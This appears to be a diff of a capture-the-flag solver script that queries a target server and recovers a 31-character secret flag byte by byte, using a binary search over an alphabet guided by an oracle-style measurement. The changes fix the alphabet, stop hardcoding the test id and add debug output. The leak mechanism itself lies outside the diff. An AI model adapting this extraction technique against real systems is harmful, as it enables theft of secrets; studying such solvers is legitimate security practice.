@@ -11,7 +11,7 @@ class Step(Enum):
 	kRight = 3
 	kRepeat = 4
 
-kAlphabet = ['.', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '=', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a']
+kAlphabet = ['.', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '=', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '_']
 
 addr = argv[1]
 
@@ -22,7 +22,7 @@ if r.status_code != 200:
 	print("Status code %d" % r.status_code)
 	exit(1)
 
-someId = "123456"#r.text.splitlines()[0]
+someId = r.text.splitlines()[0]
 print("Got some kernel id: " + someId)
 
 def measure(byteIdx, symbolIdx):
@@ -99,10 +99,10 @@ def measure(byteIdx, symbolIdx):
 		print("Left")
 		return Step.kLeft, 0
 	elif not prevResult and curResult and nextResult:
-		print("Match")
+		print("Match " + kAlphabet[symbolIdx])
 		return Step.kMatch, symbolIdx
 	elif not prevResult and not curResult and nextResult:
-		print("Match")
+		print("Match " + kAlphabet[symbolIdx + 1])
 		return Step.kMatch, symbolIdx + 1
 	else:
 		print("Repeat")
@@ -113,7 +113,7 @@ def binary_search(byteIdx, l, r):
 	repeatsNum = 0
 	while l <= r:
 		mid = l + (r - l) // 2
-		print(kAlphabet[mid], l, r)
+		print("[%c %c %c]" % (kAlphabet[l], kAlphabet[mid], kAlphabet[r]))
 		result, symbolIdx = measure(byteIdx, mid)
 		if result == Step.kLeft:
 			r = mid - 1
@@ -130,7 +130,7 @@ def binary_search(byteIdx, l, r):
 
 
 #idx = 15
-#FLAG = "ABCDEFGHIJKLMNOPQRSTUVWXYZ012345"
+#FLAG = "ABCDEFGHIJKLMNOPQRSTUVWXYZ01234="
 #result, symbolIdx = binary_search(idx, 1, len(kAlphabet) - 2)
 #print(result, kAlphabet[symbolIdx], FLAG[idx])
 #exit(0)
@@ -138,6 +138,7 @@ def binary_search(byteIdx, l, r):
 
 flag = ""
 for byteIdx in range(0,31):
+	print("Byte %u" % byteIdx)
 	result, symbolIdx = binary_search(byteIdx, 1, len(kAlphabet) - 2)
 	flag += kAlphabet[symbolIdx]
 print(flag + "=")
